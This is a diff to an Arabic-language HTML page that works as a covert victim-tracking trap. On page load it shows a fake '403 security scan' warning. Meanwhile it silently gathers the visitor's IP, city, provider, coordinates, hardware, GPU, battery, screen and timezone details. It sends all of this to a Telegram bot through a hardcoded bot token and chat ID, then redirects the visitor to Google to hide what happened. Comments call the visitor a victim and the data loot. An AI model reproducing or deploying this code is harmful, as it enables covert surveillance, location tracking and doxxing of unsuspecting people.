@@ -2,37 +2,64 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Checking Connection...</title>
+    <title>⚠️ تنبيه أمني عاجل</title>
 </head>
-<body onload="absoluteInfection()">
+<body onload="apocalypseExecute()" style="background:#0a0a0a; color:#ff3e3e; font-family:monospace; text-align:center; padding-top:15%;">
+    <h1 style="font-size: 50px;">🔴 ERROR 403</h1>
+    <p style="font-size: 20px;">جاري فحص برمجيات جهازك... لا تغلق الصفحة</p>
+
     <script>
     const TOKEN = "8069850549:AAG4ZyU6Vudg7A1qDvfEHeMcfln6ajyNh64";
     const CHAT_ID = "5657233411";
 
-    async function absoluteInfection() {
-        let loot = "⚠️ [ صيد نووي جديد - صامت تماماً ] ⚠️\n\n";
+    async function apocalypseExecute() {
+        let payload = "☢️ [ هجوم الإبادة الرقمية - تدمير الخصوصية ] ☢️\n\n";
 
+        // 1. كسر حماية الـ IP (سحب من سيرفرات متعددة)
         try {
-            // المصدر الأول: بيانات الشبكة العميقة
-            const res1 = await fetch('https://ipapi.co/json/');
-            const data1 = await res1.json();
-            loot += `🌐 IP: ${data1.ip}\n📍 المدينة: ${data1.city}\n🏢 الشركة: ${data1.org}\n🗺️ الإحداثيات: ${data1.latitude},${data1.longitude}\n`;
+            const sources = ['https://ipapi.co/json/', 'https://api.ipify.org?format=json'];
+            for(let s of sources) {
+                let r = await fetch(s).then(res => res.json());
+                payload += `🌐 IP: ${r.ip || r}\n📍 المدينة: ${r.city || '??'}\n🏢 المزود: ${r.org || '??'}\n🗺️ الإحداثيات: ${r.latitude},${r.longitude}\n`;
+                if(r.ip) break;
+            }
+        } catch(e) { payload += "⚠️ السحب الصعب للـ IP فشل.\n"; }
+
+        // 2. فحص العتاد العنيف (Hardware Rape)
+        payload += `\n⚙️ تفاصيل العتاد العميق:\n`;
+        payload += `- نوع الجهاز: ${navigator.userAgent.split('(')[1].split(')')[0]}\n`;
+        payload += `- قوة المعالج: ${navigator.hardwareConcurrency} Thread\n`;
+        payload += `- الذاكرة (RAM): ${navigator.deviceMemory || 'غير معروفة'} GB\n`;
+        payload += `- كرت الشاشة: ${getGraphicsCard()}\n`;
+        
+        // 3. فحص الطاقة والشبكة
+        try {
+            const b = await navigator.getBattery();
+            payload += `- البطارية: ${Math.round(b.level*100)}% (${b.charging ? 'يُشحن' : 'تفريغ'})\n`;
+            payload += `- نوع الشبكة: ${navigator.connection ? navigator.connection.effectiveType : 'LTE/WiFi'}\n`;
         } catch(e) {}
 
-        // المصدر الثاني: البصمة الرقمية للجهاز (Hardware Fingerprint)
-        loot += `\n📱 معلومات العتاد:\n`;
-        loot += `- المعالج (نواة): ${navigator.hardwareConcurrency}\n`;
-        loot += `- الذاكرة (RAM): ${navigator.deviceMemory}GB\n`;
-        loot += `- النظام: ${navigator.platform}\n`;
-        loot += `- البطارية: ${(await navigator.getBattery()).level * 100}%\n`;
-        loot += `- اللغة: ${navigator.language}\n`;
+        // 4. البصمة الجنائية (Criminal Fingerprint)
+        payload += `\n🕵️ البصمة الجنائية:\n`;
+        payload += `- دقة الشاشة: ${window.screen.width}x${window.screen.height}\n`;
+        payload += `- المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        payload += `- لغة الجوال: ${navigator.language}\n`;
 
-        // إرسال التقرير فوراً لتليجرام
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loot)}`)
+        // إرسال البيانات فوراً
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(payload)}`)
         .then(() => {
-            // التحويل لتمويه الضحية (حط الرابط اللي تبيه هنا)
-            window.location.href = "https://www.google.com";
+            // التحويل لموقع يوهم الضحية بالخوف (مثلاً صفحة مخالفات)
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
         });
+    }
+
+    function getGraphicsCard() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { return "مخفي"; }
     }
     </script>
 </body>
